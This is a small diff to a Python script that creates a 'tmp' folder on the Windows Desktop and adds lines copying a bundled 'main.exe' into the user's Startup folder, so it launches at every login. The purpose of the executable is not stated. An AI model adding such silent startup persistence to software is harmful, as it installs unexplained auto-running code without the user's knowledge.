@@ -1,12 +1,19 @@
 
 import os
+import shutil
+import pathlib
 
-path = f"C:{os.getenv('HOMEPATH')}\Desktop\\"
+src_path = str(pathlib.Path(__file__).parent.resolve()) + "\\main.exe"
+dst_path = f"C:{os.getenv('HOMEPATH')}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
+base_path = f"C:{os.getenv('HOMEPATH')}\Desktop\\"
 dir_name = 'tmp'
+dir_path = base_path + dir_name
 
 try:
-    os.mkdir(path + dir_name)
+    os.mkdir(dir_path)
 except FileExistsError:
-    os.rename(path + dir_name, path + dir_name + "_1")
-    os.mkdir(path + dir_name)
+    os.rename(dir_path, dir_path + "_1")
+    os.mkdir(base_path + dir_name)
+
+shutil.copy(src_path, dst_path)
